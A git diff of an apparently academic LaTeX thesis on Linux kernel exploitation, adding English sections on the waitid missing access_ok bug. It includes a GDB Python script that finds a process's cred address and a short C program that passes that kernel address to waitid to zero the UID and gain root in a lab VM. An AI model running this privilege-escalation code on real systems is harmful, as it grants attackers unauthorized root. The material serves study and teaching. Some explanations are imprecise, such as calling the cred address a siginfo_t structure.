@@ -18,7 +18,7 @@
 \definecolor{dkgreen}{rgb}{0,0.6,0}
 \definecolor{gray}{rgb}{0.5,0.5,0.5}
 \definecolor{mauve}{rgb}{0.58,0,0.82}
-
+\setlength {\marginparwidth }{2cm} 
 \lstset{frame=tb,
   aboveskip=3mm,
   belowskip=3mm,
@@ -113,7 +113,7 @@ In a user-land exploit, the allocator is inside \emph{the process}, generally co
    \makebox[\textwidth][c]{\includegraphics[height=0.4
   \textwidth]{images/linux-lines-code.png}}
    \caption{Growth of Codebase Kernel Linux}
-   \label{graphview}
+   \label{line_code_graphview}
 \end{figure} 
 The kernel has to control all the hardware on the computer and most of the lower-level software
 abstractions (virtual memory, file systems, IPC facilities, etc.). This implies many hierarchical, interconnected subsystems that the attacker may have to deeply understand to successfully trigger and exploit a specific
@@ -262,7 +262,7 @@ In particular, we will explore the resolution of a \emph{CTF}~\cite{hxp-CTF-2020
 To do this we will use a technique called \emph{ROP}~\cite{roemer2012return} with a module having an extremely trivial and standard bug.
 \section{Setup environment}
 Our task is to exploit a vulnearable custom kernel module that is installed into the kernel on boot.
-We will use the setup seen for the kernel in the section \refToSubSection{configuration} and the one for QEMU \refToSubSection{QEMU}.
+We will use the setup seen for the kernel in the section \refToSection{configuration} and the one for QEMU \refToSubSection{QEMU}.
 Since it is a CTF, where it is usual to use a flag to prove that you are getting the admin mode, you need to add some options in the QEMU setup.
 To do this, the command is also added to the QEMU settings:
 \lstinline{-hdb flag.txt}
@@ -564,7 +564,7 @@ ffffffffaab85198 R __start___ksymtab
    \makebox[\textwidth][c]{\includegraphics[height=0.61
   \textwidth]{images/findAddressToImageBase.png}}
    \caption{Find address in the stack in no randomize region}
-   \label{graphview}
+   \label{address_graphview}
 \end{figure}
 
 
@@ -781,32 +781,230 @@ In reality, they are not \emph{``insecure"}, but to use them most appropriately,
 During the development phase, as can be seen from the code above, the \texttt{access_ok} control is missing.
 This lack leads to an arbitrary write since the \textit{infop} pointer is completely controlled by the attacker allowing, therefore, to write values in an arbitrary address.
 
-\section{Exploitation}
-\label{sect:exp-cve}
-Siccome possiamo controllare il "dove" avverrà la scrittura, possiamo sicuramente sovrascrivere qualcosa con 0(hardcoded).
-Quindi l'idea di base è quella di andare a sovrascrivere l'UID del nostro processo con 0 ottenendo così i privilegi di root.
+\subsection{Analyzing the system call}
+\label{subsect:waitid}
+
+Going to the system manual pager \emph{``man''} ~\cite{torvalds2002linux} the function \texttt{int waitid (idtype_t idtype, id_t id, siginfo_t * infop, int options)}, which waits for a child process changes state, has four parameters.
+
+The \textit{idtype} and \textit {id} arguments are used to specify which children waitid () should wait for.
+
+If \textit{idtype} matches P\_PID, the function waits for the child with id equal to \textit{id}.
+If \textit{idtype} matches P\_PGID, the function expects any child with group id equal to \textit{id}.
+If \textit{idtype} matches P\_ALL, the function expects any child and \textit{id} is ignored.
+The \textit{infop} data corresponds to a very complex data structure:
+
+\begin{lstlisting}
+typedef struct {
+  int si_signo;
+  int si_code;
+  union sigval si_value;
+  int si_errno;
+  pid_t si_pid;
+  uid_t si_uid;
+  void *si_addr;
+  int si_status;
+  int si_band;
+} siginfo_t;
+\end{lstlisting}
+Specifically, we are interested in the \textit{uid\_t si\_uid} data which corresponds to the uid \refToSubSection{proc_trhreads} of the process under consideration.  
+The \textit{options} parameter is used to specify which state change the \texttt{waitid} function should wait.
+
 \subsection{Process, threads and user rights}
 \label{subsect:proc_trhreads}
-Un UID (identificatore utente) è un numero assegnato da Linux e differente per ciascun utente del sistema che si sta utilizzando.
-E' utilizzato per identificare l'utente nel sistema e per determinare a quali risorse di sistema, come file e cartelle, l'utente può accedere.
-L'utente root ha l'UID impostato a 0; solitamente ai nuovi utenti del sistema viene assegnato un numero compreso tra 500 e 1000.
-L'UID di un processo viene salvato in una struttura dati chiamata struct cred.
-Per capire come vengono gestiti i processi andiamo ad analizzare una system call molto importante: fork
+A \emph{UID} (user identifier) is a number assigned by Linux and different for each user on the system you are using.
+It is used to identify the user on the system and to determine which system resources, such as files and folders, the user can access.
+The root user has the UID set to 0. Usually, new users of the system are assigned a number between 500 and 1000.
+The UID of a process is saved in a data structure called \texttt{struct cred}.
+
+
+\subsection{How the system call works}
+\label{subsect:how_waitid}
+
+To understand what the \texttt{waitid} function does, I applied the same to a \textit{signinfo\_t} variable in a C file, assigned sensible values to the variable and displayed what it contains before and after the call to the system call.
+
+\begin{lstlisting}
+int main(){
+  int p;
+  int uid;
+  int err;
+  siginfo_t test;
+  if (fork()==0){
+        p = getpid();
+        uid = syscall(__NR_getuid);
+        sleep(5);
+        test.si_signo = 1234;
+        test.si_code = SIGILL;
+        test.si_errno = 56;
+        test.si_pid = p;
+        test.si_uid = uid;
+        printf("Address test %x\n",&test);
+        printf("si_signo %d\n",test.si_signo);
+        printf("si_errno %d\n",test.si_errno);
+        printf("si_code %d\n",test.si_code);
+        printf("si_pid %d\n",test.si_pid);
+        printf("si_uid %d\n",test.si_uid);
+        printf("si_status %d\n",test.si_status);
+        printf("si_addr %x\n\n",test.si_addr);
+        err = syscall(__NR_waitid, P_PID, p, &test, WEXITED, NULL);
+        //err = waitid(P_PID, p, &test, WEXITED, NULL);
+        printf("After waitid \n");
+        printf("si_signo %d\n",test.si_signo);
+        printf("si_errno %d\n",test.si_errno);
+        printf("si_code %d\n",test.si_code);
+        printf("si_pid %d\n",test.si_pid);
+        printf("si_uid %d\n",test.si_uid);
+        printf("si_status %d\n",test.si_status);
+        printf("si_addr %x\n\n",test.si_addr);
+  }
+\end{lstlisting}
+\begin{figure}[h!]
+\caption{Before and after using the waitid function applied to a variable in userspace. As we can see it clears all the fields of the data structure.}
+   \makebox[\textwidth][c]{\includegraphics[height=0.65
+  \textwidth]{images/how-waitid-works.png}}
+   \label{waitid_show}
+\end{figure} 
+
+The value of \textit{si\_uid} set to 0 \glnote{use 0 or zero?} After the function call, thus in a hypothetical scenario where the attacker is able to manipulate this structure, he will get for the process corresponding to its root privileges.
+
+\section{Verify the bug}
+\label{sect:bug}
+
+
+Using the configuration for the Kernel seen in the \refToSection{configuration}, \emph{GDB}, seen in the \refToSubSection{gdb}, and the QEMU configuration seen in the \refToSubSection{QEMU}, it is possible to show how a local privilege escalation \emph{LPE} can be achieved.
+
+
+
+\subsection{Python inside GDB}
+\label{subsect:py_gdb}
+
+By connecting to the virtual machine made ad hoc with QEMU we can see the activities in progress within the system with the command \texttt{lx-ps}.
+This command shows the starting address that an activity occupies within the stack, the progressive number of activities corresponding to the activity and the name of the same.
+Using GDB with a Python program we can take advantage of the commands provided by the kernel for debugging.
+
+\begin{lstlisting}
+import os, tempfile
+import gdb
+
+class CachedType:
+    def __init__(self, name):
+        self._type = None
+        self._name = name
+
+    def _new_objfile_handler(self, event):
+        self._type = None
+        gdb.events.new_objfile.disconnect(self._new_objfile_handler)
+
+    def get_type(self):
+        if self._type is None:
+            self._type = gdb.lookup_type(self._name)
+            if self._type is None:
+                raise gdb.GdbError(
+                    "cannot resolve type '{0}'".format(self._name))
+            if hasattr(gdb, 'events') and hasattr(gdb.events, 'new_objfile'):
+                gdb.events.new_objfile.connect(self._new_objfile_handler)
+        return self._type
+
+
+long_type = CachedType("long")
+
+def get_long_type():
+    global long_type
+    return long_type.get_type()
+
+def offset_of(typeobj, field):
+    element = gdb.Value(0).cast(typeobj)
+    return int(str(element[field].address).split()[0], 16)
+
+def container_of(ptr, typeobj, member):
+    return (ptr.cast(get_long_type()) -
+            offset_of(typeobj, member)).cast(typeobj)
+
+task_type = CachedType("struct task_struct")
+
+v = gdb.lookup_type('struct task_struct').pointer()
+
+init = gdb.parse_and_eval("init_task").address
+def task_lists():
+    task_ptr_type = task_type.get_type().pointer()
+    t = g = init
+    while True:
+        while True:
+            yield t
+
+            t = container_of(t['thread_group']['next'],
+                               task_ptr_type, "thread_group")
+            if t == g:
+                break
+
+        t = g = container_of(g['tasks']['next'],
+                               task_ptr_type, "tasks")
+        if t == init:
+            return
+# Store the address in a file
+f = open("kasl",'w')
+c = 0
+for task in task_lists():
+    #gdb.write("{address} {pid} {comm}\n".format(address=task,pid=task["pid"],comm=task["comm"].string()))
+    comm = task["comm"].string()
+    name_task = "activity"
+    if comm == name_task:
+        print(task['cred'])
+        f.write(str(task['cred']))
+        f.write("\n")
+f.close()
+
+N.B. To run this program inside GDB we used the command: source -s -v filename.py
+\end{lstlisting}
+
+This program allows you to print the address of the \textit{signinfo\_t} structure relating to the name of the process contained in the \textit{name\_task} variable both on the GDB terminal and within a file.
+
+
+\subsection{LPE with C file}
+\label{subsect:lpe_c}
+
+Having total control of what happens inside the system, it is possible to create a program in C that takes as input the address returned within GDB with the program seen in \refToSubSection{py_gdb} and modify the structure \textit{signinfo\_t} of the process gaining root privileges.
+We will consider as a process the user bash (test) we are in.
+
+\begin{lstlisting}
+int main(){
+  int p;
+  int err;
+  if (fork()==0){
+        p = getpid();
+        unsigned long long addr = 0xffff880176e81600;
+        err = syscall(__NR_waitid, P_PID, p, addr, WEXITED, NULL);
+        //err = waitid(P_PID,p,addr,WEXITED);
+  }
+  return 0;
+}
+\end{lstlisting}
+
+This program creates a fork ~\cite{fork} and inserts the \emph{PID} of the newly created process into the waitid and waits for it to terminate.
+With these few command lines, it is possible to obtain root privileges for the logged-in user.
+
+\begin{figure}[h!]
+\caption{Example of local privilege escalation with GDB, DEBUG of Kernel and C file}
+   \makebox[\textwidth][c]{\includegraphics[height=0.65
+  \textwidth]{images/lpe_with_c.png}}
+   \label{lpe_c}
+\end{figure} 
+
+
+As can be seen from the figure ~\ref{lpe_c}, after the execution of the program the test user obtains root privileges and performs the operations as such.
+By logging out and logging back in with the same user, it is possible to observe how the test user no longer has these privileges.
+
+This happens for a very simple reason: the new test user process has a different position in the stack than the previous session.
 
 
 
 
 
- 
+
 \chapter{Conclusion}
 \bibliographystyle{alphaurl}
 \bibliography{bib}
 \end{document}
 
-QEMU-system-i386 -hda archlinux-i686.img -boot d -cdrom ../archlinux
-.12.01-dual.iso -m 1024
-
-sudo debootstrap --include=vim,openssh-server,isc-dhcp-client  stable /tmp/mount1/ http://deb.debian.org/debian/
 
 
 
